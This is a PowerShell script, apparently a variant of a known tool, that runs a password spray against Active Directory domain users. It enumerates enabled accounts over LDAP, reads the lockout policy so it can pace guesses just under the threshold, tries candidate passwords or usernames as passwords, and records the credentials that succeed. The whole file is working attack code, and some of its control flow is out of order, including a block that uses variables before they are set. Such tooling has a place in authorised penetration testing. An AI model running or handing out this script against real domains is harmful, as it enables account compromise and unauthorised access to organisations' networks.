function Invoke-DomainPasswordSpray{
    <#
    .SYNOPSIS
    Performs a password spray attack against domain users. Can target single or multiple users.

    .PARAMETER Username
    Optional parameter for targeting a single username.

    .PARAMETER UserList
    Optional UserList parameter. This will be generated automatically if not specified.

    .PARAMETER Password
    A single password that will be used to perform the password spray.

    .PARAMETER PasswordList
    A list of passwords one per line to use for the password spray.

    .PARAMETER OutFile
    A file to output the results to.

    .PARAMETER Domain
    The domain to spray against.

    .PARAMETER Filter
    Custom LDAP filter for users, e.g. "(description=*admin*)"

    .PARAMETER Force
    Forces the spray to continue and doesn't prompt for confirmation.

    .PARAMETER Fudge
    Extra wait time between each round of tests (seconds).

    .PARAMETER Delay
    Delay between attempts in seconds.

    .PARAMETER Jitter
    Random variation in delay (0-1).

    .PARAMETER Quiet
    Reduces output verbosity.

    .PARAMETER UsernameAsPassword
    For each user, tries their username as their password.

    .EXAMPLE
    Invoke-DomainPasswordSpray -Username "testuser" -Password "Winter2023"
    
    .EXAMPLE
    Invoke-DomainPasswordSpray -Password Winter2016
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $false)]
        [string]
        $Username = "",

        [Parameter(Position = 1, Mandatory = $false)]
        [string]
        $UserList = "",

        [Parameter(Position = 2, Mandatory = $false)]
        [string]
        $Password,

        [Parameter(Position = 3, Mandatory = $false)]
        [string]
        $PasswordList,

        [Parameter(Position = 4, Mandatory = $false)]
        [string]
        $OutFile,

        [Parameter(Position = 5, Mandatory = $false)]
        [string]
        $Filter = "",

        [Parameter(Position = 6, Mandatory = $false)]
        [string]
        $Domain = "",

        [Parameter(Position = 7, Mandatory = $false)]
        [switch]
        $Force,

        [Parameter(Position = 8, Mandatory = $false)]
        [switch]
        $UsernameAsPassword,

        [Parameter(Position = 9, Mandatory = $false)]
        [int]
        $Delay=0,

        [Parameter(Position = 10, Mandatory = $false)]
        $Jitter=0,

        [Parameter(Position = 11, Mandatory = $false)]
        [switch]
        $Quiet,

        [Parameter(Position = 12, Mandatory = $false)]
        [int]
        $Fudge=10,

        [Parameter(Position = 13, Mandatory = $false)]
        [ValidateSet('Quiet', 'Normal', 'Verbose')]
        [string]$LogLevel = 'Quiet',

        [Parameter(Position = 14, Mandatory = $false)]
        [switch]$LogToFile,

        [Parameter(Position = 15, Mandatory = $false)]
        [string]$LogFilePath = "spray_log.txt",

        [Parameter(Position = 16, Mandatory = $false)]
        [int]$StatusUpdateInterval = 10,

        [Parameter(Position = 17, Mandatory = $false)]
        [switch]$ContinueOnSuccess
    )

    # Input validation
    if (-not $Password -and -not $PasswordList -and -not $UsernameAsPassword) {
        Write-Host -ForegroundColor Red "[-] Error: Either -Password, -PasswordList, or -UsernameAsPassword must be specified"
        return
    }

    # Domain connection setup
    try {
        Write-Host "[*] Testing domain connection to $Domain..."
        if ($Domain) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain", $Domain)
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
            Write-Host "[+] Successfully connected to domain: $Domain"
            Write-Host "[*] Domain DN: $CurrentDomain"
        }
        else {
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
            Write-Host "[+] Successfully connected to current domain"
        }
    }
    catch {
        Write-Host -ForegroundColor Red "[-] Failed to connect to domain: $($_.Exception.Message)"
        return
    }

    # Set up passwords array
    $Passwords = @()
    if ($Password) {
        # Check if Password parameter is a file path
        if (Test-Path $Password) {
            Write-Host "[*] Password parameter appears to be a file. Reading passwords from: $Password"
            $Passwords = Get-Content $Password
            Write-Host "[*] Loaded $($Passwords.Count) passwords from file"
        } else {
            $Passwords = @($Password)
            Write-Host "[*] Using single password for testing"
        }
    }
    elseif ($PasswordList) {
        if (-not (Test-Path $PasswordList)) {
            Write-Host -ForegroundColor Red "[-] Error: Password list file not found at path: $PasswordList"
            return
        }
        $Passwords = Get-Content $PasswordList
        Write-Host "[*] Loaded $($Passwords.Count) passwords from $PasswordList"
    }
    
    # Add spray round calculations
    if ($Passwords.Count -gt 0) {
        $roundsRequired = [math]::Ceiling($Passwords.Count)
        Write-Host "`n[*] Spray Statistics:"
        Write-Host "    - Total Passwords to Test: $($Passwords.Count)"
        Write-Host "    - Spray Rounds Required: $roundsRequired"
        
        if ($observation_window -gt 0) {
            $estimatedDuration = $roundsRequired * $observation_window
            Write-Host "    - Estimated Total Duration: $estimatedDuration minutes"
            $estimatedCompletion = (Get-Date).AddMinutes($estimatedDuration)
            Write-Host "    - Estimated Completion Time: $($estimatedCompletion.ToString('yyyy-MM-dd HH:mm:ss'))"
        }
    }
    elseif ($UsernameAsPassword) {
        Write-Host "[*] Using usernames as passwords"
        foreach ($User in $UserListArray) {
            $currentAttempt++
            
            try {
                if ($LogLevel -eq 'Verbose') {
                    Write-Host "[*] Testing username as password for: $User"
                }
                
                $domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $User, $User)
                if ($domain_check.name -ne $null) {
                    # Only count success if we haven't found this user before
                    if (-not $SuccessfulUsers.ContainsKey($User)) {
                        $successCount++
                        Write-Host -ForegroundColor Green "[+] SUCCESS! User: $User Password: $CurrentPassword"
                        
                        # Add to successful users hash table
                        $SuccessfulUsers[$User] = $CurrentPassword
                        
                        if ($OutFile) {
                            Add-Content -Path $OutFile -Value "$User`:$CurrentPassword"
                        }
                        
                        if ($LogToFile) {
                            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                            Add-Content -Path $LogFilePath -Value "[$timestamp] SUCCESS: User: $User Password: $CurrentPassword"
                        }
                    }
                }
                elseif ($LogLevel -eq 'Verbose') {
                    Write-Host -ForegroundColor Red "[-] Failed: $User"
                }

                # Status updates
                if ((Get-Date) - $lastStatusUpdate -gt [TimeSpan]::FromSeconds($StatusUpdateInterval)) {
                    $lastStatusUpdate = Write-SprayProgress -CurrentAttempt $currentAttempt `
                                                        -TotalAttempts $UserListArray.Count `
                                                        -StartTime $startTime `
                                                        -SuccessCount $successCount `
                                                        -CurrentUser $User `
                                                        -SuccessfulUsers $SuccessfulUsers `
                                                        -CurrentRound 1 `
                                                        -TotalRounds 1 `
                                                        -ObservationWindow $observation_window
                }
            }
            catch {
                if ($LogLevel -eq 'Verbose') {
                    Write-Host -ForegroundColor Red "[-] Error testing $User`: $($_.Exception.Message)"
                }
            }

            if ($Delay -gt 0) {
                $actualDelay = $Delay
                if ($Jitter -gt 0) {
                    $actualDelay += Get-Random -Minimum 0 -Maximum ($Delay * $Jitter)
                }
                Start-Sleep -Seconds $actualDelay
            }
        }
    }

    # User verification
    $UserListArray = @()
    if ($Username) {
        Write-Host "[*] Testing single username: $Username"
        $UserListArray = @($Username)
    }
    elseif ($UserList) {
        if (-not (Test-Path $UserList)) {
            Write-Host -ForegroundColor Red "[-] Error: User list file not found"
            return
        }
        Write-Host "[*] Loading users from: $UserList"
        $UserListArray = Get-Content $UserList
        Write-Host "[+] Loaded $($UserListArray.Count) users from file"
    }
    else {
        Write-Host "[*] Enumerating domain users..."
        $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter
    }

    if (-not $UserListArray -or $UserListArray.Count -eq 0) {
        Write-Host -ForegroundColor Red "[-] Error: No valid users found to test"
        return
    }

    # Calculate tracking variable for attempts
    $totalAttempts = if ($UsernameAsPassword) {
        $UserListArray.Count
    } else {
        $UserListArray.Count * $Passwords.Count  # Use the already loaded passwords array
    }

    # Continuation prompt
    if (-not $Force) {
        try {
            $lockoutThreshold = if ($Domain.Properties['lockoutthreshold']) {
                $Domain.Properties['lockoutthreshold'].Value
            } else {
                "Unknown"
            }
        } catch {
            $lockoutThreshold = "Unknown"
        }

        Write-Host "`n[!] Warning: Password spraying can cause account lockouts." -ForegroundColor Yellow
        Write-Host "[!] Domain lockout threshold: $lockoutThreshold attempts" -ForegroundColor Yellow
        Write-Host "[!] Testing $($UserListArray.Count) users" -ForegroundColor Yellow
        Write-Host "Do you want to continue? (Y/N)" -ForegroundColor Yellow
        $response = Read-Host
        if ($response -ne "Y") {
            Write-Host "[-] Operation cancelled by user"
            return
        }
    }

    # Get password policy
    $observation_window = Get-ObservationWindow $CurrentDomain
    Write-Host "`n[*] Domain password policy observation window: $observation_window minutes"

    # Main spray logic
    $startTime = Get-Date
    Write-Host "`n[*] Starting password spray at $($startTime.ToShortTimeString())"
    
    # Tracking variables
    $currentAttempt = 0
    $successCount = 0
    $lastStatusUpdate = Get-Date
    $SuccessfulUsers = @{}

    Write-Host "`n[*] Spray Configuration:"
    Write-Host "    - Target Domain: $Domain"
    Write-Host "    - Users to Test: $($UserListArray.Count)"
    Write-Host "    - Mode: $(if ($UsernameAsPassword) { 'Username as Password' } else { 'Password List' })"
    Write-Host "    - Output File: $(if ($OutFile) { $OutFile } else { 'None' })"
    Write-Host "    - Delay: $(if ($Delay -gt 0) { "$Delay seconds" } else { 'None' })"
    if ($Jitter -gt 0) {
        Write-Host "    - Jitter: $Jitter"
    }
    
    if ($UsernameAsPassword) {
        foreach ($User in $UserListArray) {
            $currentAttempt++
            
            try {
                if ($LogLevel -eq 'Verbose') {
                    Write-Host "[*] Testing username as password for: $User"
                }
                
                $domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $User, $User)
                if ($domain_check.name -ne $null) {
                    $successCount++
                    Write-Host -ForegroundColor Green "[+] SUCCESS! User: $User Password: $User"
                    $SuccessfulUsers[$User] = $User
                    
                    if ($OutFile) {
                        Add-Content -Path $OutFile -Value "$User`:$User"
                    }
                    if ($LogToFile) {
                        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                        Add-Content -Path $LogFilePath -Value "[$timestamp] SUCCESS: User: $User Password: $User"
                    }
                }
                else {
                    if ($LogLevel -eq 'Verbose') {
                        Write-Host -ForegroundColor Red "[-] Failed: $User"
                    }
                }

                # Status updates
                if ((Get-Date) - $lastStatusUpdate -gt [TimeSpan]::FromSeconds($StatusUpdateInterval)) {
                    $lastStatusUpdate = Write-SprayProgress -CurrentAttempt $currentAttempt `
                                                        -TotalAttempts $totalAttempts `
                                                        -StartTime $startTime `
                                                        -SuccessCount $successCount `
                                                        -CurrentUser $User `
                                                        -CurrentPassword $CurrentPassword `
                                                        -SuccessfulUsers $SuccessfulUsers `
                                                        -CurrentRound $currentRound `
                                                        -TotalRounds $Passwords.Count `
                                                        -ObservationWindow $observation_window
                }
            }
            catch {
                if ($LogLevel -eq 'Verbose') {
                    Write-Host -ForegroundColor Red "[-] Error testing $User`: $($_.Exception.Message)"
                }
            }

            if ($Delay -gt 0) {
                $actualDelay = $Delay
                if ($Jitter -gt 0) {
                    $actualDelay += Get-Random -Minimum 0 -Maximum ($Delay * $Jitter)
                }
                Start-Sleep -Seconds $actualDelay
            }
        }
    }
    else {
        $currentRound = 0
        foreach ($CurrentPassword in $Passwords) {
            $currentRound++
            Write-Host "`n[*] Starting password spray round $currentRound of $($Passwords.Count)"
            Write-Host "[*] Testing password: $CurrentPassword"
            Write-Host "[*] Remaining rounds after this: $($Passwords.Count - $currentRound)"
            
            if ($observation_window -gt 0) {
                $remainingTime = ($Passwords.Count - $currentRound) * $observation_window
                $estimatedCompletion = (Get-Date).AddMinutes($remainingTime)
                Write-Host "[*] Estimated completion time: $($estimatedCompletion.ToString('yyyy-MM-dd HH:mm:ss'))"
            }
            
            foreach ($User in $UserListArray) {
                # Skip user if already found and not continuing on success
                if (-not $ContinueOnSuccess -and $SuccessfulUsers.ContainsKey($User)) {
                    if ($LogLevel -eq 'Verbose') {
                        Write-Host "[*] Skipping $User - already found successful password"
                    }
                    continue
                }

                $currentAttempt++
                
                try {
                    if ($LogLevel -eq 'Verbose') {
                        Write-Host "[*] Attempting: $User"
                    }
                    
                    $domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $User, $CurrentPassword)
                    if ($domain_check.name -ne $null) {
                        $successCount++
                        Write-Host -ForegroundColor Green "[+] SUCCESS! User: $User Password: $CurrentPassword"
                        
                        # Add to successful users hash table
                        $SuccessfulUsers[$User] = $CurrentPassword
                        
                        if ($OutFile) {
                            Add-Content -Path $OutFile -Value "$User`:$CurrentPassword"
                        }
                        
                        if ($LogToFile) {
                            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                            Add-Content -Path $LogFilePath -Value "[$timestamp] SUCCESS: User: $User Password: $CurrentPassword"
                        }
                    }
                    else {
                        if ($LogLevel -eq 'Verbose') {
                            Write-Host -ForegroundColor Red "[-] Failed: $User"
                        }
                        if ($LogToFile) {
                            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                            Add-Content -Path $LogFilePath -Value "[$timestamp] FAILED: User: $User Password: $CurrentPassword"
                        }
                    }

                    # Status update
                    if ((Get-Date) - $lastStatusUpdate -gt [TimeSpan]::FromSeconds($StatusUpdateInterval)) {
                        $lastStatusUpdate = Write-SprayProgress -CurrentAttempt ($currentAttempt + ($currentRound - 1) * $UserListArray.Count) `
                                                            -TotalAttempts $totalAttempts `
                                                            -StartTime $startTime `
                                                            -SuccessCount $successCount `
                                                            -CurrentUser $User `
                                                            -CurrentPassword $CurrentPassword `
                                                            -SuccessfulUsers $SuccessfulUsers `
                                                            -CurrentRound $currentRound `
                                                            -TotalRounds $Passwords.Count `
                                                            -ObservationWindow $observation_window
                    }
                }
                catch {
                    if ($LogLevel -eq 'Verbose') {
                        Write-Host -ForegroundColor Red "[-] Failed: $User - $($_.Exception.Message)"
                    }
                    if ($LogToFile) {
                        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                        Add-Content -Path $LogFilePath -Value "[$timestamp] ERROR: User: $User Password: $CurrentPassword - $($_.Exception.Message)"
                    }
                }

                if ($Delay -gt 0) {
                    $actualDelay = $Delay
                    if ($Jitter -gt 0) {
                        $actualDelay += Get-Random -Minimum 0 -Maximum ($Delay * $Jitter)
                    }
                    Start-Sleep -Seconds $actualDelay
                }
            }

            if ($observation_window -gt 0 -and $Passwords.IndexOf($CurrentPassword) -lt ($Passwords.Count - 1)) {
                Write-Host "[*] Waiting $observation_window minutes before next password..."
                Start-Sleep -Seconds (60 * $observation_window)
            }
        }

        # Final summary
        $endTime = Get-Date
        $duration = $endTime - $startTime

        Write-Host "`n[*] Password spray completed"
        Write-Host "[*] Duration: $($duration.ToString('hh\:mm\:ss'))"
        Write-Host "[*] Total attempts: $currentAttempt"
        Write-Host "[*] Successful attempts: $successCount"
        Write-Host "[*] Success rate: $([math]::Round(($successCount/$currentAttempt) * 100, 2))%"

        if ($OutFile) {
            Write-Host "[*] Results saved to: $OutFile"
        }

        # Display all successful users and their passwords in green
        if ($SuccessfulUsers.Count -gt 0) {
            Write-Host "`n[*] Successful credentials found:" -ForegroundColor Green
            foreach ($User in $SuccessfulUsers.Keys) {
                Write-Host "    $User : $($SuccessfulUsers[$User])" -ForegroundColor Green
            }
        } else {
            Write-Host "`n[-] No successful credentials found." -ForegroundColor Yellow
        }
    }
}


function Get-DomainUserList {
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $false)]
        [string]$Domain = "",

        [Parameter(Position = 1, Mandatory = $false)]
        [switch]$RemoveDisabled,

        [Parameter(Position = 2, Mandatory = $false)]
        [switch]$RemovePotentialLockouts,

        [Parameter(Position = 3, Mandatory = $false)]
        [string]$Filter
    )

    try {
        Write-Host "[*] Testing domain connection to $Domain..."
        if ($Domain) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain", $Domain)
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
            Write-Host "[+] Successfully connected to domain: $Domain"
        }
        else {
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
            Write-Host "[+] Successfully connected to current domain"
        }
    }
    catch {
        Write-Host -ForegroundColor Red "[-] Failed to connect to domain: $($_.Exception.Message)"
        return
    }

    $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
    $AccountLockoutThresholds = @($objDeDomain.Properties.lockoutthreshold)

    $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
    $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
    $UserSearcher.SearchRoot = $DirEntry

    $PropertiesToLoad = @("samaccountname", "badpwdcount", "badpasswordtime")
    foreach($prop in $PropertiesToLoad) {
        $UserSearcher.PropertiesToLoad.Add($prop) > $null
    }

    if ($RemoveDisabled) {
        $baseFilter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)"
    } else {
        $baseFilter = "(&(objectCategory=person)(objectClass=user)"
    }

    if ($Filter) {
        $UserSearcher.filter = "$baseFilter$Filter)"
    } else {
        $UserSearcher.filter = "$baseFilter)"
    }

    $UserSearcher.PageSize = 1000
    $AllUserObjects = $UserSearcher.FindAll()
    $UserListArray = @()

    foreach ($user in $AllUserObjects) {
        $UserListArray += $user.Properties.samaccountname[0]
    }

    Write-Host "[*] Found $($UserListArray.Count) users"
    return $UserListArray
}

function Get-ObservationWindow {
    param([string]$DomainEntry)
    try {
        $Domain = [ADSI]$DomainEntry
        
        # Check if there's a lockout threshold first
        $lockoutThreshold = $Domain.Properties['lockoutthreshold'].Value
        if ($lockoutThreshold -eq 0) {
            Write-Host "[*] No lockout threshold detected - proceeding without delays"
            return 0
        }
        
        $lockOutObservationWindow = $Domain.Properties['lockoutObservationWindow'].Value
        $observationWindowMinutes = $Domain.ConvertLargeIntegerToInt64($lockOutObservationWindow) / -600000000
        
        Write-Host "[*] Lockout threshold detected: $lockoutThreshold attempts"
        return $observationWindowMinutes
    }
    catch {
        Write-Warning "Failed to get domain policy, defaulting to no lockout policy"
        return 0
    }
}

function Write-SprayProgress {
    param (
        [Parameter(Mandatory=$true)]
        [int]$CurrentAttempt,
        
        [Parameter(Mandatory=$true)]
        [int]$TotalAttempts,
        
        [Parameter(Mandatory=$true)]
        [DateTime]$StartTime,
        
        [Parameter(Mandatory=$true)]
        [int]$SuccessCount,
        
        [Parameter(Mandatory=$true)]
        [string]$CurrentUser,
        
        [Parameter(Mandatory=$false)]
        [string]$CurrentPassword = "",
        
        [Parameter(Mandatory=$false)]
        [hashtable]$SuccessfulUsers = @{},

        [Parameter(Mandatory=$false)]
        [int]$CurrentRound = 0,

        [Parameter(Mandatory=$false)]
        [int]$TotalRounds = 0,

        [Parameter(Mandatory=$false)]
        [int]$ObservationWindow = 0
    )

    $percentComplete = [math]::Round(($CurrentAttempt / $TotalAttempts) * 100, 2)
    $elapsedTime = (Get-Date) - $StartTime
    
    # Calculate rates and time estimates
    $attemptsPerSecond = 0
    $estimatedTimeRemaining = 0
    $estimatedTimeRemainingThisRound = 0
    
    if ($CurrentAttempt -gt 0 -and $elapsedTime.TotalSeconds -gt 0) {
        # Calculate current rate
        $attemptsPerSecond = $CurrentAttempt / $elapsedTime.TotalSeconds
        
        # Calculate remaining attempts for this round
        $attemptsPerRound = $TotalAttempts / $TotalRounds
        $remainingAttemptsThisRound = $attemptsPerRound - ($CurrentAttempt % $attemptsPerRound)
        
        # Calculate time remaining for this round
        $estimatedTimeRemainingThisRound = $remainingAttemptsThisRound / $attemptsPerSecond
        
        # Calculate total remaining attempts including future rounds
        $remainingAttempts = $TotalAttempts - $CurrentAttempt
        
        # Calculate total time remaining
        $estimatedTimeRemaining = $remainingAttempts / $attemptsPerSecond

        # Add observation window waits for remaining rounds
        if ($TotalRounds -gt 0 -and $ObservationWindow -gt 0) {
            $remainingRounds = $TotalRounds - $CurrentRound
            if ($remainingRounds -gt 0) {
                $estimatedTimeRemaining += ($remainingRounds * $ObservationWindow * 60)
            }
        }

        $estimatedTimeRemaining = [Math]::Max(0, $estimatedTimeRemaining)
        $estimatedTimeRemainingThisRound = [Math]::Max(0, $estimatedTimeRemainingThisRound)
    }
    
    # Format time values
    $elapsedTimeFormatted = Format-TimeSpan $elapsedTime
    $remainingTimeFormatted = Format-TimeSpan ([TimeSpan]::FromSeconds($estimatedTimeRemaining))
    $remainingTimeRoundFormatted = Format-TimeSpan ([TimeSpan]::FromSeconds($estimatedTimeRemainingThisRound))
    
    Write-Host "`n[*] Status Update:"
    if ($TotalRounds -gt 0) {
        Write-Host "    Round: $CurrentRound of $TotalRounds"
    }
    Write-Host "    Progress: $CurrentAttempt/$TotalAttempts ($percentComplete%)"
    Write-Host "    Current username: $CurrentUser"
    if ($CurrentPassword) {
        Write-Host "    Current password: $CurrentPassword"
    }
    Write-Host "    Rate: $([math]::Round($attemptsPerSecond, 1)) attempts/second"
    Write-Host "    Successful attempts: $SuccessCount"
    if ($SuccessfulUsers.Count -gt 0) {
        Write-Host "    Successful users: $($SuccessfulUsers.Count)"
    }
    Write-Host "    Elapsed time: $elapsedTimeFormatted"
    Write-Host "    Time remaining this round: $remainingTimeRoundFormatted"
    Write-Host "    Estimated total time remaining: $remainingTimeFormatted"
    
    if ($ObservationWindow -gt 0 -and $CurrentRound -lt $TotalRounds) {
        Write-Host "    Observation window between rounds: $ObservationWindow minutes"
    }
    
    return (Get-Date)
}

function Format-TimeSpan {
    param (
        [Parameter(Mandatory=$true)]
        [TimeSpan]$TimeSpan
    )
    
    $parts = @()
    
    if ($TimeSpan.Days -gt 0) {
        $parts += "$($TimeSpan.Days) days"
    }
    if ($TimeSpan.Hours -gt 0) {
        $parts += "$($TimeSpan.Hours) hours"
    }
    if ($TimeSpan.Minutes -gt 0) {
        $parts += "$($TimeSpan.Minutes) minutes"
    }
    if ($TimeSpan.Seconds -gt 0 -or $parts.Count -eq 0) {
        $parts += "$($TimeSpan.Seconds) seconds"
    }
    
    return [string]::Join(" ", $parts)
}

function Countdown-Timer {
    param(
        [Parameter(Mandatory=$true)]
        [int]$Seconds,
        
        [Parameter(Mandatory=$false)]
        [string]$Message = "[*] Waiting to avoid account lockout",
        
        [Parameter(Mandatory=$false)]
        [switch]$Quiet = $False
    )
    
    if ($Quiet) {
        Write-Host "$Message - Waiting $($Seconds/60) minutes"
        Start-Sleep -Seconds $Seconds
    }
    else {
        $endTime = (Get-Date).AddSeconds($Seconds)
        
        while ((Get-Date) -lt $endTime) {
            $timeLeft = $endTime - (Get-Date)
            $percentComplete = (($Seconds - $timeLeft.TotalSeconds) / $Seconds) * 100
            
            Write-Progress -Activity $Message `
                -Status "$([math]::Round($timeLeft.TotalMinutes,1)) minutes remaining" `
                -PercentComplete $percentComplete
            
            Start-Sleep -Seconds 1
        }
        
        Write-Progress -Activity $Message -Completed
    }
}
